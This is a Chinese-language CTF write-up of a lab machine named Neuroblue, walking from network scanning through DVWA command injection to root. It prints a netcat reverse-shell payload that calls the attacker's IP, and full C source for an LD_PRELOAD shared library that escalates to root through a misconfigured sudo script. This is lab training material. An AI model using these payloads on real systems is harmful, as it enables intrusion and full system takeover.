## 渗透测试报告 - Neuroblue

## 1. 简介

**靶机名称**: Neuroblue
**难度**: 简单
**攻击者 IP:** `192.168.205.188` (Kali Linux)
**目标 IP:** `192.168.205.203` (Neuroblue)

## 2. 信息收集 (Enumeration)

### 2.1. 网络发现 (Network Discovery)

使用 `arp-scan` 在本地网络中探测存活主机。

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l        
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.188
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       (Unknown)
192.168.205.2   00:50:56:f4:ef:6f       (Unknown)
192.168.205.203 08:00:27:53:84:22       (Unknown) # <-- 发现目标
192.168.205.254 00:50:56:ec:d6:ae       (Unknown)

Ending arp-scan 1.10.0: 256 hosts scanned in 1.871 seconds (136.83 hosts/sec). 4 responded
```

目标主机 IP 确定为 `192.168.205.203`。MAC 地址 `08:00:27:53:84:22`。

### 2.2. 端口扫描 (Port Scanning)

使用 `nmap` 对目标进行端口扫描，识别开放的 TCP 端口。

* 进行全端口扫描 (`-p-`) 确定开放端口。

  ```bash
  ┌──(kali㉿kali)-[~]
  └─$ nmap -p- 192.168.205.203 
  Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-01 02:10 EDT
  Nmap scan report for 192.168.205.203
  Host is up (0.00014s latency).
  Not shown: 65533 closed tcp ports (reset)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
  MAC Address: 08:00:27:53:84:22 (PCS Systemtechnik/Oracle VirtualBox virtual NIC) # <-- 确认 VirtualBox
  
  Nmap done: 1 IP address (1 host up) scanned in 5.15 seconds
  ```

  结果显示目标开放了两个常见的端口：`22 (SSH)` 和 `80 (HTTP)`。

### 2.3. Web 服务探测 (Web Enumeration)

访问 80 端口的 HTTP 服务 `http://192.168.205.203/wordpress/`。

![DVWA Login Page](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250501141142075.png)

页面显示为 DVWA (Damn Vulnerable Web Application) 的登录界面。DVWA 是一个知名的故意包含漏洞的 Web 应用，用于安全测试和学习。

DVWA 通常有默认的登录凭据。

![DVWA Logged In](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250501141310014.png)

## 3. 获取初始访问权限 (Initial Access - DVWA Command Injection)

### 3.1. 漏洞发现与利用 (Vulnerability Discovery & Exploitation)

* **登录 DVWA:** 尝试使用 DVWA 的默认凭据 `admin` / `password`。成功登录。

  ![image-20250501141405799](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250501141405948.png)

* **寻找注入点:** 浏览 DVWA 的功能模块，发现 "Command Injection" 模块。

* **初步测试:** 尝试执行简单命令，如 `127.0.0.1; id`。

  ![Initial Command Injection Attempt (Blocked)](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250501141546233.png)

  初始尝试被 DVWA 的安全级别阻止。

* **降低安全级别:** DVWA 允许调整安全级别。导航到 "DVWA Security" 页面，将安全级别设置为 "Low"。

  ![Setting Security Level to Low](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250501141634505.png)

* **再次测试:** 在 "Low" 安全级别下，再次尝试命令注入。输入 `127.0.0.1; id`。

  ![Successful Command Injection (Low Security)](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250501141746295.png)

  命令 `id` 成功执行，确认存在命令注入漏洞。

* **构造反弹 Shell Payload:** 为了获取交互式 Shell，构造一个反弹 Shell Payload。
  Payload: `127.0.0.1;nc 192.168.205.188 8888 -e /bin/bash`

* **设置监听器:** 在攻击机 (Kali) 上使用 `nc` 设置监听器，等待反弹连接。

  ```bash
  ┌──(kali㉿kali)-[/mnt/hgfs/gx/test]
  └─$ nc -lvnp 8888            
  listening on [any] 8888 ...
  ```

* **执行 Payload:** 在 DVWA 的命令注入页面提交反弹 Shell Payload。

### 3.2. 获取 Shell (Gaining Access)

提交 Payload 后，DVWA 页面会持续加载。返回 Kali 终端，监听器应收到连接。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/test]
└─$ nc -lvnp 8888            
listening on [any] 8888 ...
connect to [192.168.205.188] from (UNKNOWN) [192.168.205.203] 35542 # <-- 连接成功
```

* **稳定 Shell:** 获得的初始 Shell 通常功能有限。使用标准技术提升为功能更全的 TTY Shell。

  ```bash
  # 在反弹 shell 中执行
  script /dev/null -c bash  
  # 按 Ctrl+Z 暂停
  # 在 Kali 终端执行
  stty raw -echo; fg  
  # 按 Enter 恢复，然后继续在反弹 shell 中执行
  reset xterm  
  export TERM=xterm  
  export SHELL=/bin/bash  
  stty rows 40 columns 178 # 可选，调整大小
  ```

* **确认用户:** 检查当前用户身份。

  ```bash
  www-data@Neuroblue:/var/www/html/wordpress/vulnerabilities/exec$ id
  uid=33(www-data) gid=33(www-data) groups=33(www-data) 
  ```

  成功以 `www-data` 用户身份获得初始访问权限。

## 4. 权限提升 (`www-data` -> `welcome` -> `root`)

### 4.1. 以 `www-data` 身份进行信息收集 (Enumeration as `www-data`)

* **探索家目录:** 检查 `/home` 目录。

  ```bash
  www-data@Neuroblue:/var/www/html/wordpress/vulnerabilities/exec$ cd /home/
  www-data@Neuroblue:/home$ ls -al
  total 12
  drwxr-xr-x  3 root    root    4096 Apr 11 22:27 .
  drwxr-xr-x 18 root    root    4096 Mar 18 20:37 ..
  drwxrwxrwx  2 welcome welcome 4096 Apr 30 09:17 welcome
  ```

* **检查 `welcome` 目录:** 查看 `welcome` 用户的主目录内容。

  ```bash
  www-data@Neuroblue:/home$ cd welcome/
  www-data@Neuroblue:/home/welcome$ ls -al
  total 48
  drwxrwxrwx 2 welcome welcome  4096 Apr 30 09:17 .
  drwxr-xr-x 3 root    root     4096 Apr 11 22:27 ..
  lrwxrwxrwx 1 root    root        9 Apr 30 07:10 .bash_history -> /dev/null
  -rw-r--r-- 1 welcome welcome   220 Apr 11 22:27 .bash_logout
  -rw-r--r-- 1 welcome welcome  3526 Apr 11 22:27 .bashrc
  -rw-r--r-- 1 welcome welcome   807 Apr 11 22:27 .profile
  lrwxrwxrwx 1 root    root        9 Apr 30 09:17 .viminfo -> /dev/null
  -rwx--x--x 1 root    root    22208 Apr 30 08:09 2048_hack # <-- 可执行文件
  -rw-r--r-- 1 root    root       44 Apr 30 07:10 user.txt # <-- 用户 Flag
  ```

* **获取 User Flag:** 读取 `user.txt`。

  ```bash
  www-data@Neuroblue:/home/welcome$ cat user.txt 
  flag{user-aa85e179cb0acf7cc4da7d2afcd53488}
  ```

* **分析 `2048_hack` 程序:** 检查这个可执行文件的帮助信息。

  ```bash
  www-data@Neuroblue:/home/welcome$ ./2048_hack --help
  Usage: 2048 [OPTION] | [MODE]
  Play the game 2048 in the console
  
  Options:
    -h,  --help       Show this help message.
    -v,  --version    Press x. # <-- 有趣的提示
  
  Modes:
    bluered      Use a blue-to-red color scheme (requires 256-color terminal support).
    blackwhite   The black-to-white color scheme (requires 256-color terminal support).
  ```

  提示 "Press x" 值得注意。

* **运行 `2048_hack` 并交互:** 运行程序并按 'x' 键。

  ```bash
  www-data@Neuroblue:/home/welcome$ ./2048_hack 
  # (程序启动，用户按 'x')
  ```

  ![2048_hack output after pressing x](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250501142419714.png)

  程序提示凭据已保存到 `/home/welcome/.cred`。

* **获取凭据:** 查看新创建的 `.cred` 文件。

  ```bash
  www-data@Neuroblue:/home/welcome$ ls -la
  total 52
  drwxrwxrwx 2 welcome  welcome   4096 May  1 02:23 .
  drwxr-xr-x 3 root     root      4096 Apr 11 22:27 ..
  lrwxrwxrwx 1 root     root         9 Apr 30 07:10 .bash_history -> /dev/null
  -rw-r--r-- 1 welcome  welcome    220 Apr 11 22:27 .bash_logout
  -rw-r--r-- 1 welcome  welcome   3526 Apr 11 22:27 .bashrc
  -rw-r--r-- 1 www-data www-data    52 May  1 02:23 .cred
  -rw-r--r-- 1 welcome  welcome    807 Apr 11 22:27 .profile
  lrwxrwxrwx 1 root     root         9 Apr 30 09:17 .viminfo -> /dev/null
  -rwx--x--x 1 root     root     22208 Apr 30 08:09 2048_hack
  -rw-r--r-- 1 root     root        44 Apr 30 07:10 user.txt
  www-data@Neuroblue:/home/welcome$ cat .cred
  77656c636f6d653a666438363966363639333039613737636464
  ```

  这是一串十六进制编码的字符串。

* **解码凭据:** 使用工具（如 CyberChef 或在线转换器）将十六进制解码为 ASCII。

  ![Hex to ASCII conversion](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250501142514282.png)

  解码结果为：`welcome:fd869f669309a77cdd`。这是 `welcome` 用户的凭据。

### 4.2. 切换用户 (`www-data` -> `welcome`)

使用获取到的凭据切换到 `welcome` 用户。

```bash
www-data@Neuroblue:/home/welcome$ su welcome
Password: 
welcome@Neuroblue:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

成功切换到 `welcome` 用户。

### 4.3. 以 `welcome` 身份进行信息收集 (寻找提权向量)

检查 `welcome` 用户的 `sudo` 权限。

```bash
welcome@Neuroblue:/tmp$ sudo -l
Matching Defaults entries for welcome on Neuroblue:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on Neuroblue:
    (root) NOPASSWD: /opt/export # <-- 允许以 root 无密码执行 /opt/export
```

同时，查看 `/opt/export` 脚本的内容和权限：

```bash
welcome@Neuroblue:/tmp$ cat /opt/export
#!/bin/bash

if [ -z $1 ] ;then
        echo "This is VMBreaker export program."
        /usr/local/sbin/VMBreaker
        exit 1
fi

export "$1"="$2" # <-- 关键：使用参数设置环境变量
export "$3"="$4"
export "$5"="$6"
export "$7"="$8"
/usr/local/sbin/VMBreaker # <-- 最后执行另一个程序

welcome@Neuroblue:/tmp$ ls -al /opt/export 
-rwxr-xr-x 1 root root 207 Apr 30 08:55 /opt/export
```

**关键发现:**

1.  `welcome` 用户可以无需密码以 root 权限执行 `/opt/export`。这是提权的入口。
2.  `sudoers` 配置中包含 `env_reset`，这意味着通过 `sudo` 直接传递 `LD_PRELOAD` 环境变量（如 `sudo LD_PRELOAD=... /opt/export`）会被阻止。
3.  `/opt/export` 脚本本身存在一个**严重漏洞**：它将命令行参数直接用作 `export` 命令的参数，允许我们控制脚本内部设置的环境变量名称和值。
4.  脚本最后会执行 `/usr/local/sbin/VMBreaker`。

### 4.4. 利用策略 (Exploitation Strategy - Exploiting Script Argument Handling for LD_PRELOAD Injection)

我们的目标是利用 `/opt/export` 脚本的漏洞来设置 `LD_PRELOAD` 环境变量，从而劫持后续 `/usr/local/sbin/VMBreaker` 的执行流程。

计划：

1.  编写一个 C 文件 (`exp.c`)，包含一个构造函数 (`__attribute__((constructor))`)。这个函数会在库被加载时自动执行，其功能是设置 `uid` 和 `gid` 为 0，然后启动一个具有 root 权限的 shell (`/bin/bash -p`)。
2.  将 `exp.c` 编译成共享库文件 `/tmp/exp.so`。
3.  执行 `sudo /opt/export` 命令，巧妙地将 `LD_PRELOAD` 作为第一个参数 (`$1`)，将我们恶意库的路径 `/tmp/exp.so` 作为第二个参数 (`$2`) 传递给脚本。
4.  脚本执行到 `export "$1"="$2"` 时，就会在 **root 权限**下执行 `export LD_PRELOAD=/tmp/exp.so`。
5.  当脚本最后执行 `/usr/local/sbin/VMBreaker` 时，由于 `LD_PRELOAD` 环境变量已被设置，动态链接器会优先加载 `/tmp/exp.so`，从而执行我们的恶意代码，获得 root shell。

### 4.5. 执行利用 (Executing the Exploit)

1. **创建恶意 C 代码:**
   切换到可写目录 `/tmp`，创建 `exp.c` 文件。

   ```bash
   welcome@Neuroblue:~$ cd /tmp
   welcome@Neuroblue:/tmp$ cat << EOF > exp.c
   #define _GNU_SOURCE
   #include <stdio.h>
   #include <stdlib.h>
   #include <unistd.h>
   #include <dlfcn.h>
   
   // 构造函数，在库加载时自动执行
   void __attribute__((constructor)) _init() {
       unsetenv("LD_PRELOAD"); // 清理环境变量，避免影响子shell
       setuid(0);             // 设置UID为root
       setgid(0);             // 设置GID为root
       system("/bin/bash -p"); // 执行一个保留权限的root shell
       exit(0); // 执行完shell后退出，避免后续程序执行（可选）
   }
   EOF
   ```

2. **编译共享库:**
   使用 `gcc` 编译 C 代码为共享库。

   ```bash
   welcome@Neuroblue:/tmp$ gcc -fPIC -shared -o /tmp/exp.so /tmp/exp.c -nostartfiles
   welcome@Neuroblue:/tmp$ ls -l /tmp/exp.so
   -rwxr-xr-x 1 welcome welcome 14736 May  1 02:29 /tmp/exp.so # <-- 编译成功
   ```

3. **触发漏洞并注入:**
   执行 `sudo /opt/export` 命令，并传递精心构造的参数。

   ```bash
   welcome@Neuroblue:/tmp$ sudo /opt/export LD_PRELOAD /tmp/exp.so "" "" "" "" "" ""
   # 此处脚本内部执行 export LD_PRELOAD=/tmp/exp.so
   # 然后执行 /usr/local/sbin/VMBreaker
   # VMBreaker 加载时，动态链接器发现 LD_PRELOAD，加载 exp.so
   # exp.so 的构造函数被执行...
   root@Neuroblue:/tmp# 
   ```

### 4.6. 获取 Root 权限 (Gaining Root Access)

成功执行上述 `sudo` 命令后，`/tmp/exp.so` 中的构造函数被触发，我们直接获得了一个 root 权限的 shell。

```bash
root@Neuroblue:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@Neuroblue:/tmp# whoami
root
```

成功获取 root 权限。

* **获取 Root Flag:** 读取 `/root/root.txt` 文件。

  ```bash
  root@Neuroblue:/tmp# cat /root/root.txt 
  flag{root-3960a29b415a278c2d88bb0543c5f283}
  ```



**注记：** 在本报告的撰写过程中，AI 语言模型为部分章节的文本组织、概念阐述及语言优化提供了辅助支持。